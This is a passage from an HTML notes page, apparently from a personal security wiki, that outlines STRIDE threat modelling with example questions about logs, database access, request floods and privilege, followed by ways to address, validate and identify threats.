<li><strong>Repudiation</strong> - claiming you didn’t do something (regardless of whether you did or not).<ul>
<li>Logs and log tampering prevention</li>
</ul>
</li>
<li><strong>Information Disclosure</strong> - exposing information to people who are not authorized to see it.<ul>
<li>Can anyone connect to DB</li>
<li>What happens if someone connect to DB </li>
</ul>
</li>
<li><strong>Denial of Service</strong> - attacks designed to prevent a system from providing service<ul>
<li>What happens if 1000s of request come at same time</li>
</ul>
</li>
<li><strong>Elevation of Privilege</strong> - program or user is able to do things that they’re not supposed to do.<ul>
<li>What prevents users from connecting directly to the backend</li>
<li>What controls access to DB </li>
</ul>
</li>
</ul>
</li>
<li>Address Threats - What should you do about those things that can go wrong?<ul>
<li>Mitigating threats - doing things to make it harder to take advantage of a threat</li>
<li>Eliminating threats - almost always achieved by eliminating features</li>
<li>Transferring threats - letting someone or something else handle the risk</li>
<li>Accepting the risk</li>
</ul>
</li>
<li>Validate - Did you do a decent job of analysis?</li>
</ul>
</li>
<li>Identifying Threats<ul>
<li>Start with external entities</li>
<li>Never ignore a threat because it’s not what you’re looking for right now</li>
<li>Focus on feasible threats</li>
</ul>
</li>
</ul>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../apt/" title="APT" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                APT
              </span>
            </div>
          </a>
        
        
          <a href="../bug-hunting/" title="Bug hunting" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Bug hunting
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
      
    
  </body>
</html>